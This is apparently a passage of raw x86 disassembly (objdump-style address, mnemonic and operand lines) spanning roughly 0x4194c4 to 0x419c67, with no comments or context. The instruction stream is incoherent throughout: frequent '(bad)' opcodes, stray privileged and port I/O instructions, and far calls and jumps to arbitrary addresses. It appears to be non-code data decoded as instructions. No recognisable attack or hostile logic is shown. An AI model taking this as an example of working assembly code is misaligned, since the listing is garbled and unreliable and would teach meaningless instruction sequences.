  4194c4:	stos   BYTE PTR es:[edi],al
  4194c5:	inc    BYTE PTR [edi-0x3]
  4194c8:	icebp  
  4194c9:	or     al,bl
  4194cb:	lahf   
  4194cc:	ins    BYTE PTR es:[edi],dx
  4194cd:	mov    ch,0x70
  4194cf:	dec    esp
  4194d0:	mov    BYTE PTR [ecx+ebp*1+0x58ca9142],cl
  4194d7:	cli    
  4194d8:	xor    edx,0xb405521c
  4194de:	sahf   
  4194df:	xor    BYTE PTR [ebp+0x2a9dc3a3],bl
  4194e5:	pop    ss
  4194e6:	repnz out dx,eax
  4194e8:	or     dl,0xfb
  4194eb:	xor    eax,0xc4b8eb7e
  4194f0:	gs pushw 0x9af5
  4194f5:	test   eax,0x4e8770ca
  4194fa:	in     eax,dx
  4194fb:	fwait
  4194fc:	xchg   DWORD PTR [esi-0x31],esp
  4194ff:	cmp    eax,0x465352ed
  419504:	mov    edx,0x2dcbe024
  419509:	xor    edi,DWORD PTR [ecx+0x5f157eb9]
  41950f:	mov    ch,0xb0
  419511:	mov    cl,0xc8
  419513:	in     al,0x56
  419515:	mov    ebx,0xc68a0016
  41951a:	outs   dx,BYTE PTR ds:[esi]
  41951b:	mov    WORD PTR [ecx],ds
  41951d:	cmp    BYTE PTR [ebp+0x74],dh
  419520:	iret   
  419521:	popf   
  419522:	or     bh,dh
  419524:	xchg   esi,eax
  419525:	js     0x419571
  419527:	(bad)  
  419528:	jmp    0x4194be
  41952a:	and    dh,BYTE PTR [edx-0x71]
  41952d:	test   dh,dh
  41952f:	pop    edi
  419530:	out    dx,al
  419531:	pop    edi
  419532:	push   esp
  419533:	pop    ebp
  419534:	mov    eax,ds:0xb366a2b8
  419539:	xchg   esp,eax
  41953a:	mov    ecx,0xfdba690e
  41953f:	pop    edx
  419540:	xlat   BYTE PTR ds:[ebx]
  419541:	inc    esp
  419542:	sahf   
  419543:	xchg   DWORD PTR [edi+0x3b835c43],edi
  419549:	jb     0x419527
  41954b:	out    0xe8,eax
  41954d:	xor    BYTE PTR [edx],cl
  41954f:	repnz ins DWORD PTR es:[edi],dx
  419551:	mov    edx,0x5506aefa
  419556:	dec    esp
  419557:	mov    ?,WORD PTR [eax]
  419559:	pop    edi
  41955a:	fwait
  41955b:	imul   ecx,DWORD PTR [eax+0x4807d7e4],0xcfbf7839
  419565:	and    dh,BYTE PTR [edi]
  419567:	in     al,0xad
  419569:	into   
  41956a:	jg     0x419599
  41956c:	jge    0x419517
  41956e:	mov    ch,0xdd
  419570:	push   eax
  419571:	arpl   WORD PTR [eax-0x7b2abfc4],ax
  419577:	mov    esi,0x2411f47d
  41957c:	in     al,0x3
  41957e:	pop    ds
  41957f:	call   0xad566efa
  419584:	and    al,0x5a
  419586:	sub    al,0x4c
  419588:	rcl    ecx,cl
  41958a:	mov    al,ds:0xa9c330ee
  41958f:	adc    al,0x10
  419591:	fcom   DWORD PTR cs:[ecx+0xdfb0161]
  419598:	mov    ah,0xf9
  41959a:	adc    eax,0x38dbc4b0
  41959f:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4195a1:	call   0x2316:0xbbaad0e9
  4195a8:	pop    eax
  4195a9:	inc    ebp
  4195aa:	outs   dx,BYTE PTR ds:[esi]
  4195ab:	outs   dx,BYTE PTR ds:[esi]
  4195ac:	into   
  4195ad:	and    ah,BYTE PTR [ecx+0x64a72208]
  4195b3:	fwait
  4195b4:	out    dx,eax
  4195b5:	inc    edi
  4195b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195b7:	xchg   ecx,eax
  4195b8:	and    ebx,DWORD PTR [ebp+0x3f]
  4195bb:	test   al,0x2a
  4195bd:	sbb    BYTE PTR [esi],ch
  4195bf:	ins    DWORD PTR es:[edi],dx
  4195c0:	add    ebp,DWORD PTR [edi-0x25]
  4195c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4195c4:	gs push ds
  4195c6:	jecxz  0x419608
  4195c8:	pop    ss
  4195c9:	xor    eax,DWORD PTR [ecx+0x52c5cf0c]
  4195cf:	cs test al,0x90
  4195d2:	out    dx,al
  4195d3:	and    eax,0x2cc13c5d
  4195d8:	add    eax,0x9bbb8c4b
  4195dd:	rcr    BYTE PTR [esp+eax*2],cl
  4195e0:	mov    esi,0x485e7722
  4195e5:	ror    BYTE PTR [ebp-0x35],0x6f
  4195e9:	pusha  
  4195ea:	push   esp
  4195eb:	mov    al,ds:0x23fd7a72
  4195f0:	adc    al,0xdc
  4195f2:	mov    ebx,0x7786dd67
  4195f7:	sbb    ecx,DWORD PTR [ecx]
  4195f9:	adc    al,BYTE PTR [edi+0x2]
  4195fc:	push   ds
  4195fd:	(bad)  
  4195fe:	xor    eax,DWORD PTR [esi]
  419600:	mov    dl,0x65
  419602:	xchg   edi,eax
  419603:	cdq    
  419604:	ficom  DWORD PTR [edx+0x1017c763]
  41960a:	lea    edx,[ebx]
  41960c:	mov    esp,0x8f88e3e9
  419611:	add    dh,al
  419613:	cmp    ah,dh
  419615:	mov    ch,ah
  419617:	cdq    
  419618:	(bad)  
  419619:	lods   al,BYTE PTR ds:[esi]
  41961a:	dec    DWORD PTR [ecx-0x70bcd7b1]
  419620:	aas    
  419621:	scas   al,BYTE PTR es:[edi]
  419622:	add    esi,DWORD PTR [esi]
  419624:	gs or  ah,bh
  419627:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419628:	nop
  419629:	sub    al,0x15
  41962b:	es jbe 0x41962e
  41962e:	mov    ?,WORD PTR [edi]
  419630:	mov    cl,0xed
  419632:	aas    
  419633:	mov    bh,0xe2
  419635:	xor    eax,DWORD PTR [ebx+0x69]
  419638:	(bad)  
  419639:	out    dx,al
  41963a:	mov    ds:0x8d0ccec0,eax
  41963f:	inc    edi
  419640:	stc    
  419641:	into   
  419642:	mov    cl,0xb0
  419644:	sub    al,0x6e
  419646:	or     BYTE PTR ds:0xda2c607b,dh
  41964c:	ja     0x419689
  41964e:	bound  ebx,QWORD PTR [edx+eax*8-0x29df9826]
  419655:	pop    ds
  419656:	pop    ecx
  419657:	xor    al,BYTE PTR [eax-0x1e]
  41965a:	fcmove st,st(4)
  41965c:	scas   al,BYTE PTR es:[edi]
  41965d:	ss and al,0xcd
  419660:	ins    DWORD PTR es:[edi],dx
  419661:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419662:	push   0xe8dbf1a6
  419667:	mov    eax,0x2502e864
  41966c:	xchg   ecx,eax
  41966d:	jge    0x41969f
  41966f:	or     al,0xda
  419671:	shl    DWORD PTR [eax+0x72265d76],cl
  419677:	jmp    0xa92794c6
  41967c:	loop   0x41964c
  41967e:	add    edx,DWORD PTR [esi-0x73]
  419681:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419682:	sbb    BYTE PTR [ecx+0x413a8e46],dl
  419688:	jge    0x41967f
  41968a:	in     al,dx
  41968b:	jb     0x41964f
  41968d:	xor    BYTE PTR [ecx+0xe094ae2],cl
  419693:	stos   BYTE PTR es:[edi],al
  419694:	adc    BYTE PTR gs:[ebx+0x1c],dl
  419698:	enter  0xd4ce,0x9d
  41969c:	and    al,0xca
  41969e:	test   DWORD PTR ds:0xbbc07c50,ebx
  4196a4:	or     eax,ecx
  4196a6:	push   esp
  4196a7:	jns    0x419711
  4196a9:	(bad)  
  4196aa:	xchg   edx,eax
  4196ab:	lahf   
  4196ac:	fcmove st,st(6)
  4196ae:	ins    BYTE PTR es:[edi],dx
  4196af:	adc    al,0x2f
  4196b1:	mov    dl,0x8c
  4196b3:	xor    ebx,eax
  4196b5:	lods   eax,DWORD PTR ds:[esi]
  4196b6:	aad    0x87
  4196b8:	scas   al,BYTE PTR es:[edi]
  4196b9:	mov    DWORD PTR [esp+edi*1+0x7e],esp
  4196bd:	jg     0x419703
  4196bf:	dec    esp
  4196c0:	jnp    0x419704
  4196c2:	fcmovb st,st(4)
  4196c4:	in     al,dx
  4196c5:	retf   
  4196c6:	stos   BYTE PTR es:[edi],al
  4196c7:	pop    edx
  4196c8:	ror    DWORD PTR [eax+eax*8+0x6f],cl
  4196cc:	and    edi,DWORD PTR [ecx]
  4196ce:	stos   BYTE PTR es:[edi],al
  4196cf:	add    BYTE PTR [edx],cl
  4196d1:	and    edx,ecx
  4196d3:	inc    eax
  4196d4:	mov    ecx,DWORD PTR [edx-0x3c33b851]
  4196da:	fld    TBYTE PTR [ecx+edi*8+0x3dc63e83]
  4196e1:	fcomp  DWORD PTR [eax-0x74206350]
  4196e7:	nop
  4196e8:	fisub  DWORD PTR [edi-0x14cebd2a]
  4196ee:	cwde   
  4196ef:	or     BYTE PTR [ebp-0x56],ah
  4196f2:	cli    
  4196f3:	cmp    DWORD PTR [esi+0x7ce6298d],esi
  4196f9:	retf   0x7191
  4196fc:	stos   DWORD PTR es:[edi],eax
  4196fd:	stc    
  4196fe:	add    ah,BYTE PTR [eax-0x7f]
  419701:	repz iret 
  419703:	out    0x8c,eax
  419705:	push   esp
  419706:	mov    cl,0xaf
  419708:	std    
  419709:	mov    ebx,0x751b17d3
  41970e:	(bad)  
  419710:	and    dh,BYTE PTR ss:[ebx+0x40f92915]
  419717:	push   ebx
  419718:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41971a:	ins    DWORD PTR es:[edi],dx
  41971b:	cmp    bl,dh
  41971d:	add    bl,BYTE PTR [ecx+0x2f]
  419720:	mov    ds:0xc5ac53e5,eax
  419725:	push   ss
  419726:	xchg   BYTE PTR [ebp-0x39],bh
  419729:	js     0x419715
  41972b:	sahf   
  41972c:	add    ah,BYTE PTR [esp+ebp*4]
  41972f:	adc    DWORD PTR [ecx+eax*8+0x3962df82],edx
  419736:	sub    edx,DWORD PTR [eax-0x7a]
  419739:	or     DWORD PTR [ecx-0x6ea6cacf],esp
  41973f:	mov    eax,ds:0x9689a89c
  419744:	mov    cl,0x6c
  419746:	imul   edi,DWORD PTR [edi+0x1c],0x5c3f189
  41974d:	js     0x419721
  41974f:	push   0x5e39b9
  419754:	lock xchg edi,eax
  419756:	mov    edi,0x985cbff9
  41975b:	xor    esp,DWORD PTR ds:0xea53e45b
  419761:	out    dx,eax
  419762:	push   ebp
  419763:	dec    esi
  419764:	in     al,dx
  419765:	inc    edi
  419766:	dec    edi
  419767:	shr    edi,1
  419769:	xchg   esi,eax
  41976a:	and    BYTE PTR [ebx],bl
  41976c:	sub    esp,edx
  41976e:	dec    edx
  41976f:	test   eax,0x1ce09cbb
  419774:	cmp    esp,edx
  419776:	mov    ah,0x4b
  419778:	fisub  WORD PTR [eax+ebp*8]
  41977b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41977c:	popf   
  41977d:	xchg   ecx,eax
  41977e:	fsubr  st,st(6)
  419780:	push   cs
  419781:	out    dx,eax
  419782:	xor    BYTE PTR [ebp+0x6e],cl
  419785:	fxch   st(7)
  419787:	pop    edi
  419788:	pop    ebp
  419789:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41978a:	sub    BYTE PTR [ecx+0x2a35d2a2],ch
  419790:	cli    
  419791:	adc    DWORD PTR [eax+0x7bb8a899],0x21
  419798:	iret   
  419799:	sbb    bl,bh
  41979b:	adc    al,0xcf
  41979d:	ror    BYTE PTR [edi],1
  41979f:	mov    WORD PTR [ebx-0x2905addc],cs
  4197a5:	(bad)  
  4197a6:	cmc    
  4197a7:	push   eax
  4197a8:	imul   edx,ebp,0x68b11dd
  4197ae:	or     cl,BYTE PTR [ebp+0x7e]
  4197b1:	or     DWORD PTR cs:[ebx-0x5e],edx
  4197b5:	sub    dl,BYTE PTR [edx+0xbcb8544]
  4197bb:	sub    eax,DWORD PTR ds:0x1259fa2b
  4197c1:	mov    edi,0x71c86a2c
  4197c6:	clc    
  4197c7:	xor    DWORD PTR [ebx+0x21],edi
  4197ca:	sbb    edi,DWORD PTR [ebx-0x3b]
  4197cd:	call   0xef33:0x647f7d41
  4197d4:	cmc    
  4197d5:	push   es
  4197d6:	xchg   BYTE PTR [eax-0x52],cl
  4197d9:	adc    DWORD PTR [ebp-0x64],0xffffffde
  4197dd:	(bad)  
  4197df:	lods   al,BYTE PTR ds:[esi]
  4197e0:	xchg   ebx,esi
  4197e2:	hlt    
  4197e3:	add    eax,0xae9f7831
  4197e8:	into   
  4197e9:	xor    BYTE PTR [ecx+ebx*4],bh
  4197ec:	xchg   ecx,eax
  4197ed:	jecxz  0x419813
  4197ef:	jns    0x41979a
  4197f1:	pop    edi
  4197f2:	adc    dh,BYTE PTR [ecx+esi*8+0x74]
  4197f6:	scas   al,BYTE PTR es:[edi]
  4197f7:	jge    0x41985c
  4197f9:	dec    ebx
  4197fa:	xchg   BYTE PTR [edx-0x4f],bh
  4197fd:	lods   eax,DWORD PTR ds:[esi]
  4197fe:	jno    0x419788
  419800:	cmp    eax,0x7436db26
  419805:	ds retf 
  419807:	pushf  
  419808:	push   esi
  419809:	sti    
  41980a:	mov    cl,0x65
  41980c:	(bad)  
  41980d:	jl     0x4197d3
  41980f:	test   al,0xc6
  419811:	and    eax,0xd0f68837
  419816:	outs   dx,DWORD PTR ds:[esi]
  419817:	pop    ecx
  419818:	jg     0x4197ed
  41981a:	cmp    al,0x6f
  41981c:	add    DWORD PTR [eax+0x16],0x4a96f7d6
  419823:	add    ebx,DWORD PTR [edx]
  419825:	add    BYTE PTR [eax],0xfe
  419828:	push   ebx
  419829:	lods   eax,DWORD PTR ds:[esi]
  41982a:	sbb    bh,BYTE PTR [edi+0x3d]
  41982d:	das    
  41982e:	xor    dl,dh
  419830:	cmp    bh,BYTE PTR [esi-0x227f0812]
  419836:	sub    al,0x21
  419838:	call   0x1ed9c4f
  41983d:	rcr    bl,0x78
  419840:	dec    edx
  419841:	stos   DWORD PTR es:[edi],eax
  419842:	leave  
  419843:	ja     0x419855
  419845:	xchg   ecx,eax
  419846:	mov    ah,0xca
  419848:	xor    DWORD PTR [ecx],ecx
  41984a:	mov    edx,0xf487eff
  41984f:	sub    BYTE PTR [edi-0x2f],dl
  419852:	add    eax,0x19c28ef8
  419857:	in     eax,0xc8
  419859:	push   es
  41985a:	adc    DWORD PTR [esi],eax
  41985c:	add    BYTE PTR [eax+0xbdb0251],cl
  419862:	(bad)  
  419863:	repnz imul ebp,DWORD PTR [eax],0xecec5912
  41986a:	retf   
  41986b:	fcmovb st,st(5)
  41986d:	push   ebx
  41986e:	int3   
  41986f:	xor    DWORD PTR [ebx+ebx*1-0x31],edx
  419873:	js     0x419800
  419875:	in     al,0x91
  419877:	add    eax,0x48f80222
  41987c:	and    DWORD PTR [ecx-0xa],0xf1d25cd
  419883:	pop    edx
  419884:	push   ebp
  419885:	or     ebx,DWORD PTR [ebx]
  419887:	out    0xe1,al
  419889:	(bad)  
  41988a:	cld    
  41988b:	cmp    dl,BYTE PTR [eax+0x55]
  41988e:	out    dx,eax
  41988f:	(bad)  
  419891:	(bad)  [esi+ecx*4]
  419894:	inc    eax
  419895:	sbb    al,BYTE PTR ds:0x62ccd0ee
  41989c:	call   0x1fab50b7
  4198a1:	mov    eax,ds:0xc2943281
  4198a6:	imul   edi,DWORD PTR [esi-0x61],0x2ad60f1a
  4198ad:	push   cs
  4198ae:	imul   edx,DWORD PTR [edx-0x233af7ee],0x12d44b38
  4198b8:	jo     0x4198c2
  4198ba:	dec    esi
  4198bb:	enter  0x6ea5,0xe1
  4198bf:	push   0x178ecdb4
  4198c4:	jl     0x4198fc
  4198c6:	dec    edx
  4198c7:	sahf   
  4198c8:	or     ebx,DWORD PTR [ecx-0x2d]
  4198cb:	sbb    al,BYTE PTR [eax+edi*8+0x2b]
  4198cf:	ins    DWORD PTR es:[edi],dx
  4198d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198d1:	(bad)  
  4198d3:	mov    BYTE PTR [esi+0x59],cl
  4198d6:	adc    ebp,esp
  4198d8:	std    
  4198d9:	out    0xe5,eax
  4198db:	enter  0x6b27,0xf6
  4198df:	xlat   BYTE PTR ds:[ebx]
  4198e0:	cmp    al,0x57
  4198e2:	sar    DWORD PTR [edx-0x26b7a642],0xed
  4198e9:	mov    ecx,0xb413c39f
  4198ee:	(bad)  
  4198ef:	mov    dl,0xb7
  4198f1:	jmp    0x9d3b2e86
  4198f6:	or     eax,0xd070dab2
  4198fb:	adc    bl,al
  4198fd:	jae    0x419911
  4198ff:	cmp    bl,dh
  419901:	daa    
  419902:	dec    ecx
  419903:	fiadd  DWORD PTR [edx]
  419905:	mov    bl,0x1f
  419907:	cmc    
  419908:	jb     0x41995b
  41990a:	lods   eax,DWORD PTR ds:[esi]
  41990b:	sub    BYTE PTR [eax+edx*1+0x22],al
  41990f:	gs and edx,eax
  419912:	repz loop 0x4198eb
  419915:	lahf   
  419916:	mov    ds:0x44214e60,al
  41991b:	push   0xffffffc1
  41991d:	call   0x44d3:0x57d5a493
  419924:	jle    0x419937
  419926:	imul   eax,DWORD PTR [esi+edx*4-0x7c],0x4a
  41992b:	adc    edi,DWORD PTR [eax+0x2b37a03f]
  419931:	div    DWORD PTR [ebx]
  419933:	mov    al,ds:0xd8a95b7b
  419938:	mov    ecx,0x705457c0
  41993d:	mov    ecx,0x5abb727a
  419942:	cmp    DWORD PTR [ebx+edi*8-0x3aa4c9b6],edx
  419949:	out    0x14,eax
  41994b:	repz sar BYTE PTR [ebp-0x3b],1
  41994f:	leave  
  419950:	sub    DWORD PTR [edx+0x301cc248],edi
  419956:	mov    esp,0xaa28441b
  41995b:	xchg   ebp,eax
  41995c:	je     0x419950
  41995e:	mov    al,ds:0xcc75d46
  419963:	sbb    DWORD PTR [eax+ecx*8-0x32f0bdf8],0xa52693cd
  41996e:	add    BYTE PTR [ebp+0x29],dl
  419971:	add    DWORD PTR [ebp+0x7f6fbe27],ebp
  419977:	das    
  419978:	dec    edx
  419979:	or     al,0xf1
  41997b:	test   DWORD PTR [eax],edi
  41997d:	sbb    esp,0x650b1498
  419983:	(bad)  
  419984:	pop    esi
  419985:	aam    0xbb
  419987:	lods   al,BYTE PTR ds:[esi]
  419988:	cmp    DWORD PTR [ebp-0x1b91aec0],ebx
  41998e:	and    eax,0x4c59a708
  419993:	and    BYTE PTR [ebx+0x5859149d],al
  419999:	arpl   WORD PTR gs:[edi-0x35],di
  41999d:	push   cs
  41999e:	pop    edx
  41999f:	fld    DWORD PTR [eax-0x48]
  4199a2:	dec    edx
  4199a3:	and    BYTE PTR [edx+0x5aafb53a],0xc6
  4199aa:	fisubr WORD PTR [ebp+eax*8+0x3eb2b818]
  4199b1:	je     0x41993f
  4199b3:	jmp    0xff64:0x2aa474ed
  4199ba:	push   esi
  4199bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199bc:	pop    esp
  4199bd:	adc    bl,bl
  4199bf:	in     al,0x4c
  4199c1:	inc    eax
  4199c2:	leave  
  4199c3:	fistp  QWORD PTR [ebp+0x33]
  4199c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199c7:	mov    al,ds:0x38dd4cb9
  4199cd:	icebp  
  4199ce:	adc    BYTE PTR [eax-0x69b18d51],al
  4199d4:	add    bh,BYTE PTR [edx-0x1b0cbd04]
  4199da:	push   cs
  4199db:	push   esi
  4199dc:	or     eax,0x39089f97
  4199e1:	dec    ebp
  4199e2:	lods   al,BYTE PTR ds:[esi]
  4199e3:	xor    dl,cl
  4199e5:	lods   eax,DWORD PTR ds:[esi]
  4199e6:	div    ebp
  4199e8:	pop    esp
  4199e9:	adc    DWORD PTR [ebx],eax
  4199eb:	mul    BYTE PTR ds:0xd8ab0af9
  4199f1:	or     DWORD PTR [edx],edi
  4199f3:	dec    esi
  4199f4:	jmp    FWORD PTR [edx-0x65]
  4199f7:	sti    
  4199f8:	add    ebx,DWORD PTR [ecx-0x75]
  4199fb:	xchg   BYTE PTR [edx+edx*2-0x4e],bl
  4199ff:	xchg   DWORD PTR [ecx-0x28],ecx
  419a02:	call   0x3110:0x7d8ec52c
  419a09:	cdq    
  419a0a:	dec    ebx
  419a0b:	mov    bh,0x41
  419a0d:	sub    eax,ecx
  419a0f:	in     al,0x71
  419a11:	pop    eax
  419a12:	adc    al,0x21
  419a14:	push   esp
  419a15:	inc    ecx
  419a16:	aad    0xbd
  419a18:	test   dh,0xe8
  419a1b:	mov    bl,BYTE PTR [ebx]
  419a1d:	jl     0x4199c3
  419a1f:	cmp    al,0x9
  419a21:	dec    ebx
  419a22:	test   DWORD PTR [edi+0x77],0xd0b2f1b2
  419a29:	mov    eax,ds:0x157eac98
  419a2e:	sub    al,BYTE PTR [esp+ebx*1-0x306a9091]
  419a35:	ins    BYTE PTR es:[edi],dx
  419a36:	aaa    
  419a37:	xchg   ebp,eax
  419a38:	out    dx,eax
  419a39:	sbb    al,0x29
  419a3b:	dec    ebp
  419a3c:	push   esp
  419a3d:	jl     0x419ab5
  419a3f:	xchg   edx,eax
  419a40:	scas   al,BYTE PTR es:[edi]
  419a41:	(bad)  
  419a42:	sbb    DWORD PTR [esi+ebp*2-0x3ab20240],edx
  419a49:	into   
  419a4a:	pop    edi
  419a4b:	scas   eax,DWORD PTR es:[edi]
  419a4c:	shl    BYTE PTR [ebp+0x56],1
  419a4f:	dec    edi
  419a50:	iret   
  419a51:	push   ds
  419a52:	jecxz  0x419a26
  419a54:	iret   
  419a55:	mov    ebx,0x8b51cf8d
  419a5a:	ror    DWORD PTR [ebp+0x68],0xef
  419a5e:	leave  
  419a5f:	jae    0x419ad6
  419a61:	adc    eax,0xfdc5d193
  419a66:	out    0x32,al
  419a68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a69:	stos   BYTE PTR es:[edi],al
  419a6a:	icebp  
  419a6b:	cld    
  419a6c:	pusha  
  419a6d:	jmp    0x85dd30b2
  419a72:	(bad)  
  419a74:	enter  0x60ab,0x86
  419a78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a79:	in     al,dx
  419a7a:	mov    ebp,0x6be68287
  419a7f:	(bad)  
  419a80:	and    al,0xcb
  419a82:	jge    0x419a72
  419a84:	mov    ch,0x40
  419a86:	popa   
  419a87:	and    ecx,DWORD PTR [eax-0x2f]
  419a8a:	cli    
  419a8b:	cmp    BYTE PTR ds:0xf998b930,bl
  419a91:	sbb    al,0x20
  419a93:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a95:	or     cl,BYTE PTR [edx+0x27]
  419a98:	mov    cl,0xc1
  419a9a:	cmp    ebx,edi
  419a9c:	test   esp,edi
  419a9e:	ds dec eax
  419aa0:	pop    ds
  419aa1:	cmp    DWORD PTR [eax+0x603f38c8],esp
  419aa7:	popa   
  419aa8:	inc    edi
  419aa9:	cmp    edi,DWORD PTR [eax]
  419aab:	jno    0x419abb
  419aad:	xlat   BYTE PTR fs:[ebx]
  419aaf:	and    ebp,DWORD PTR [edx+0x7a]
  419ab2:	(bad)  
  419ab3:	(bad)  
  419ab4:	stc    
  419ab5:	movd   DWORD PTR [ebx+0x7c],mm6
  419ab9:	pushf  
  419aba:	mov    cl,bl
  419abc:	fcmovnbe st,st(5)
  419abe:	aas    
  419abf:	jns    0x419acf
  419ac1:	jp     0x419abc
  419ac3:	inc    edx
  419ac4:	inc    ecx
  419ac5:	pop    ds
  419ac6:	push   edi
  419ac7:	outs   dx,BYTE PTR ds:[esi]
  419ac8:	pop    es
  419ac9:	sbb    edx,edi
  419acb:	fsubr  st,st(0)
  419acd:	fwait
  419ace:	pop    edx
  419acf:	jp     0x419a77
  419ad1:	cmp    bl,ch
  419ad3:	test   BYTE PTR [ebx+0x50],0xab
  419ad7:	xchg   edi,eax
  419ad8:	push   cs
  419ad9:	popa   
  419ada:	call   0xa3dc:0xa6585174
  419ae1:	aam    0xb
  419ae3:	(bad)  
  419ae4:	sbb    BYTE PTR [eax-0x35],ch
  419ae7:	or     bh,dl
  419ae9:	mov    ebx,0x34451105
  419aee:	(bad)  
  419aef:	out    dx,al
  419af0:	push   esp
  419af1:	mov    eax,0x3c6fbb1b
  419af6:	sti    
  419af7:	add    BYTE PTR ds:0x13b49faa,ch
  419afd:	imul   esi,DWORD PTR [esi+edx*1+0x30],0xd
  419b02:	out    dx,al
  419b03:	xlat   BYTE PTR ds:[ebx]
  419b04:	sub    DWORD PTR [edx+0x58166b76],ecx
  419b0a:	fisttp WORD PTR [edx-0x4e]
  419b0d:	xchg   BYTE PTR [esi],dh
  419b0f:	in     eax,dx
  419b10:	cmp    dl,BYTE PTR [esi+ebx*8-0x14faf60a]
  419b17:	pushf  
  419b18:	jae    0x419ab4
  419b1a:	mov    ebx,0x5e777bff
  419b1f:	sub    eax,0x4094432b
  419b24:	pop    ebx
  419b25:	inc    ecx
  419b26:	aas    
  419b27:	add    DWORD PTR [esi+ebp*2+0x6eb80382],eax
  419b2e:	ficom  DWORD PTR [esi+edi*4+0x44088fca]
  419b35:	xchg   edx,eax
  419b36:	mov    ch,0x4a
  419b38:	aam    0x8b
  419b3a:	adc    eax,ecx
  419b3c:	test   DWORD PTR [ebp+0x5f75f8d1],esp
  419b42:	or     DWORD PTR [ebp+0x6a],esp
  419b45:	cmp    al,0xe2
  419b47:	jg     0x419b3d
  419b49:	pop    esi
  419b4a:	jne    0x419b43
  419b4c:	out    0x2c,eax
  419b4e:	inc    esi
  419b4f:	sahf   
  419b50:	add    BYTE PTR [esi],bh
  419b52:	xor    edx,0xf
  419b55:	xchg   ecx,eax
  419b56:	mov    ch,0x3b
  419b58:	cmp    DWORD PTR cs:[ebx],ebp
  419b5b:	pop    ebx
  419b5c:	or     eax,0xb99cf28
  419b61:	mov    esi,0x520ba5e
  419b66:	adc    BYTE PTR [esi+edx*4],dl
  419b69:	test   BYTE PTR [ebx-0xab23212],ah
  419b6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b70:	test   dh,ch
  419b72:	or     al,0xc9
  419b74:	mov    ecx,0xa81ce5f9
  419b79:	inc    ecx
  419b7a:	sbb    ax,0x5766
  419b7e:	xor    ebp,eax
  419b80:	(bad)  
  419b81:	xor    DWORD PTR [esi],esi
  419b83:	mov    cl,0x8d
  419b85:	add    al,0x98
  419b87:	fbstp  TBYTE PTR [ebx-0x58]
  419b8a:	mov    cl,0x8c
  419b8c:	jp     0x419b2a
  419b8e:	lds    edx,FWORD PTR [edx+0x29072e66]
  419b94:	ss sbb eax,0xf5b9dbf5
  419b9a:	pop    esi
  419b9b:	(bad)  
  419b9c:	loope  0x419b3d
  419b9e:	retf   0x4965
  419ba1:	inc    edi
  419ba2:	xchg   ebx,eax
  419ba3:	push   esp
  419ba4:	push   ds
  419ba5:	pop    ss
  419ba6:	mov    edx,0x73780848
  419bab:	xchg   ecx,eax
  419bac:	je     0x419b49
  419bae:	sti    
  419baf:	outs   dx,DWORD PTR ds:[esi]
  419bb0:	mov    WORD PTR [esi-0x39],ss
  419bb3:	loope  0x419bb8
  419bb5:	cmp    ah,BYTE PTR [edi]
  419bb7:	clc    
  419bb8:	push   es
  419bb9:	inc    ebp
  419bba:	add    edx,DWORD PTR [edi]
  419bbc:	push   es
  419bbd:	adc    DWORD PTR [eax-0x8],eax
  419bc0:	bnd jp 0x419bf0
  419bc3:	jne    0x419c2a
  419bc5:	or     eax,0x50cf9575
  419bca:	ret    
  419bcb:	mov    ah,BYTE PTR [ebx]
  419bcd:	repz and dl,bh
  419bd0:	push   ss
  419bd1:	aas    
  419bd2:	ror    ecx,1
  419bd4:	and    al,0xc4
  419bd6:	test   eax,0x3db82d89
  419bdb:	arpl   cx,dx
  419bdd:	stos   BYTE PTR es:[edi],al
  419bde:	and    al,0x88
  419be0:	retf   0x2bce
  419be3:	dec    ebx
  419be4:	mov    eax,ds:0xe6e254d0
  419be9:	jb     0x419c10
  419beb:	fdivr  QWORD PTR [edi]
  419bed:	sub    al,BYTE PTR [ecx+ebx*8]
  419bf0:	outs   dx,DWORD PTR ds:[esi]
  419bf1:	mov    edx,ebp
  419bf3:	(bad)  
  419bf4:	sub    eax,0x51705e1e
  419bf9:	call   0xff6:0x2edbc098
  419c00:	jge    0x419c27
  419c02:	pusha  
  419c03:	mov    edi,0xcbba81bd
  419c08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c09:	and    eax,0x162f58df
  419c0e:	js     0x419bc4
  419c10:	mov    bh,0x9d
  419c12:	lahf   
  419c13:	or     eax,0x519beaaf
  419c18:	repz push ds
  419c1a:	pop    eax
  419c1b:	ins    BYTE PTR es:[edi],dx
  419c1c:	sahf   
  419c1d:	mov    ah,0xbd
  419c1f:	fxch   st(2)
  419c21:	cs sbb eax,0x9babef94
  419c27:	xor    eax,0x1e9c4fed
  419c2c:	arpl   WORD PTR [eax+0x2502f874],dx
  419c32:	cwde   
  419c33:	adc    eax,0x65e10d04
  419c38:	shl    BYTE PTR [eax-0x7b],1
  419c3b:	xchg   BYTE PTR [eax+0x5b22dd4f],cl
  419c41:	or     BYTE PTR [ebx+0x20],ch
  419c44:	add    ah,ah
  419c46:	add    BYTE PTR [ebx],dl
  419c48:	lds    ebx,FWORD PTR [edx+0x2]
  419c4b:	jl     0x419ca3
  419c4d:	lock push ebp
  419c4f:	pop    eax
  419c50:	jo     0x419c51
  419c52:	cdq    
  419c53:	push   ecx
  419c54:	pop    edx
  419c55:	sbb    al,bl
  419c57:	pop    eax
  419c58:	outs   dx,BYTE PTR ds:[esi]
  419c59:	pop    ebx
  419c5a:	mov    cl,0xed
  419c5c:	bound  ecx,QWORD PTR [ebx-0x5f]
  419c5f:	shl    al,1
  419c61:	cs dec ebp
  419c63:	les    esi,FWORD PTR [ebx]
  419c65:	aas    
  419c66:	push   esi
  419c67:	or     bl,BYTE PTR [esi+ecx*2+0x542c411a]
